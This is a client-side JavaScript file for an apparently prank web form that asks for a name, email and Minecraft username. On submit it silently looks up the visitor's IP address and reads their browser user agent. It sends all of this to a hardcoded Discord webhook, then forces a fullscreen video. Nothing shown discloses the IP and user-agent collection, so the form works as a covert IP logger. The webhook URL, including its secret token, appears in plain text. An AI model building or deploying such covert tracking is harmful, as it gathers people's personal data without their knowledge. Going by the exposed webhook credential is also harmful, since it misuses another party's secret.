// 幹 不要看我寫的爛 code
const formContainer = document.getElementById('form-container');
const form = document.getElementById('userInfoForm');
const nameInput = document.getElementById('name');
const emailInput = document.getElementById('email');
const minecraftNameInput = document.getElementById('minecraftName');
const submitBtn = document.getElementById('submitBtn');
const videoElement = document.getElementById('fullscreen-video');
const errorMessageElement = document.getElementById('errorMessage');

form.addEventListener('submit', handleSubmit);

async function getUserInfo() {
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ipAddress = ipData.ip;
    const userAgent = navigator.userAgent;

    return { ipAddress, userAgent };
  } catch (error) {
    console.error('無法取得使用者資訊:', error);
    return { ipAddress: '無法取得', userAgent: navigator.userAgent };
  }
}

async function handleSubmit(event) {
  event.preventDefault();
  errorMessageElement.style.display = 'none';
  submitBtn.disabled = true;
  submitBtn.textContent = '提交中...';

  const name = nameInput.value.trim();
  const email = emailInput.value.trim();
  const minecraftName = minecraftNameInput.value.trim();

  if (!name || !email || !minecraftName) {
    showError('姓名、Email 和 Minecraft 名稱皆為必填項。');
    resetSubmitButton();
    return;
  }
  if (!validateEmail(email)) {
    showError('請輸入有效的 Email 地址。');
    resetSubmitButton();
    return;
  }

  const userInfo = await getUserInfo();

  const payload = {
    embeds: [{
      title: "✨ 新的表單提交 ✨",
      color: 0x764ba2,
      fields: [
        { name: " 姓名", value: name, inline: true },
        { name: " Minecraft 名稱", value: minecraftName, inline: true },
        { name: " Email", value: email, inline: false },
        { name: " IP 位址", value: userInfo.ipAddress, inline: false },
        { name: " User Agent", value: userInfo.userAgent, inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  try {
    const response = await fetch("https://discord.com/api/webhooks/1354808419651026995/7mNuqudonoF3kxW7HxqPcyDPP7AgExVEDy5jmQuIQve8IptaZ1qQnoQZfzfZdaOpey5A", {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('成功發送到伺服器！');
      playVideoFullscreen();
    } else {
      console.error('發送到伺服器失敗:', response.status, response.statusText);
      const errorData = await response.json().catch(() => ({}));
      showError(`提交失敗，無法連接到通知服務。`);
      resetSubmitButton();
    }
  } catch (error) {
    console.error('提交過程中發生錯誤:', error);
    showError('提交過程中發生網絡錯誤，請稍後再試。');
    resetSubmitButton();
  }
}

function playVideoFullscreen() {
    formContainer.classList.add('hidden');
    setTimeout(() => {
        formContainer.style.display = 'none';
        videoElement.style.display = 'block';
        videoElement.play().then(() => {
            console.log('影片開始播放');
            requestFullscreen(videoElement);
        }).catch(error => {
            console.error('影片自動播放失敗:', error);
            showError('影片自動播放失敗，您可能需要手動點擊播放按鈕。');
            requestFullscreen(videoElement);
        });
    }, 500);
}

function requestFullscreen(element) {
    if (element.requestFullscreen) {
        element.requestFullscreen().catch(err => {
            console.warn(`無法自動進入全螢幕模式: ${err.message}`);
        });
    } else if (element.webkitRequestFullscreen) { /* Safari */
        element.webkitRequestFullscreen().catch(err => {
             console.warn(`無法自動進入全螢幕模式 (webkit): ${err.message}`);
        });
    } else if (element.msRequestFullscreen) { /* IE11 */
        element.msRequestFullscreen().catch(err => {
            console.warn(`無法自動進入全螢幕模式 (ms): ${err.message}`);
        });
    }
}

function showError(message) {
    errorMessageElement.textContent = message;
    errorMessageElement.style.display = 'block';
}

function resetSubmitButton() {
    submitBtn.disabled = false;
    submitBtn.textContent = '提交';
}

function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(String(email).toLowerCase());
}